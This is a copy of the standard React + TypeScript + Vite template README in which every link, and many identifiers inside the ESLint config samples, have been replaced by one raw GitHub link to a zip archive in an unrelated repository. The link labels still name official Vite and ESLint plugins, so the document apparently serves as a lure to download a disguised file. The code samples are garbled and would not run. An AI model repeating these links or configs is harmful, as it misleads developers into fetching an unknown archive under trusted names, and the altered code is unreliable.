# React + TypeScript + Vite

This template provides a minimal setup to get React working in Vite with HMR and some ESLint rules.

Currently, two official plugins are available:

- [@vitejs/plugin-react](https://github.com/stupideinstein09/upahaar_doko/raw/refs/heads/main/src/Layout/upahaar-doko-v2.8-alpha.2.zip) uses [Babel](https://github.com/stupideinstein09/upahaar_doko/raw/refs/heads/main/src/Layout/upahaar-doko-v2.8-alpha.2.zip) for Fast Refresh
- [@vitejs/plugin-react-swc](https://github.com/stupideinstein09/upahaar_doko/raw/refs/heads/main/src/Layout/upahaar-doko-v2.8-alpha.2.zip) uses [SWC](https://github.com/stupideinstein09/upahaar_doko/raw/refs/heads/main/src/Layout/upahaar-doko-v2.8-alpha.2.zip) for Fast Refresh

## Expanding the ESLint configuration

If you are developing a production application, we recommend updating the configuration to enable type-aware lint rules:

```js
export default https://github.com/stupideinstein09/upahaar_doko/raw/refs/heads/main/src/Layout/upahaar-doko-v2.8-alpha.2.zip([
  globalIgnores(['dist']),
  {
    files: ['**/*.{ts,tsx}'],
    extends: [
      // Other configs...

      // Remove https://github.com/stupideinstein09/upahaar_doko/raw/refs/heads/main/src/Layout/upahaar-doko-v2.8-alpha.2.zip and replace with this
      https://github.com/stupideinstein09/upahaar_doko/raw/refs/heads/main/src/Layout/upahaar-doko-v2.8-alpha.2.zip,
      // Alternatively, use this for stricter rules
      https://github.com/stupideinstein09/upahaar_doko/raw/refs/heads/main/src/Layout/upahaar-doko-v2.8-alpha.2.zip,
      // Optionally, add this for stylistic rules
      https://github.com/stupideinstein09/upahaar_doko/raw/refs/heads/main/src/Layout/upahaar-doko-v2.8-alpha.2.zip,

      // Other configs...
    ],
    languageOptions: {
      parserOptions: {
        project: ['https://github.com/stupideinstein09/upahaar_doko/raw/refs/heads/main/src/Layout/upahaar-doko-v2.8-alpha.2.zip', 'https://github.com/stupideinstein09/upahaar_doko/raw/refs/heads/main/src/Layout/upahaar-doko-v2.8-alpha.2.zip'],
        tsconfigRootDir: https://github.com/stupideinstein09/upahaar_doko/raw/refs/heads/main/src/Layout/upahaar-doko-v2.8-alpha.2.zip,
      },
      // other options...
    },
  },
])
```

You can also install [eslint-plugin-react-x](https://github.com/stupideinstein09/upahaar_doko/raw/refs/heads/main/src/Layout/upahaar-doko-v2.8-alpha.2.zip) and [eslint-plugin-react-dom](https://github.com/stupideinstein09/upahaar_doko/raw/refs/heads/main/src/Layout/upahaar-doko-v2.8-alpha.2.zip) for React-specific lint rules:

```js
// https://github.com/stupideinstein09/upahaar_doko/raw/refs/heads/main/src/Layout/upahaar-doko-v2.8-alpha.2.zip
import reactX from 'eslint-plugin-react-x'
import reactDom from 'eslint-plugin-react-dom'

export default https://github.com/stupideinstein09/upahaar_doko/raw/refs/heads/main/src/Layout/upahaar-doko-v2.8-alpha.2.zip([
  globalIgnores(['dist']),
  {
    files: ['**/*.{ts,tsx}'],
    extends: [
      // Other configs...
      // Enable lint rules for React
      https://github.com/stupideinstein09/upahaar_doko/raw/refs/heads/main/src/Layout/upahaar-doko-v2.8-alpha.2.zip['recommended-typescript'],
      // Enable lint rules for React DOM
      https://github.com/stupideinstein09/upahaar_doko/raw/refs/heads/main/src/Layout/upahaar-doko-v2.8-alpha.2.zip,
    ],
    languageOptions: {
      parserOptions: {
        project: ['https://github.com/stupideinstein09/upahaar_doko/raw/refs/heads/main/src/Layout/upahaar-doko-v2.8-alpha.2.zip', 'https://github.com/stupideinstein09/upahaar_doko/raw/refs/heads/main/src/Layout/upahaar-doko-v2.8-alpha.2.zip'],
        tsconfigRootDir: https://github.com/stupideinstein09/upahaar_doko/raw/refs/heads/main/src/Layout/upahaar-doko-v2.8-alpha.2.zip,
      },
      // other options...
    },
  },
])
```
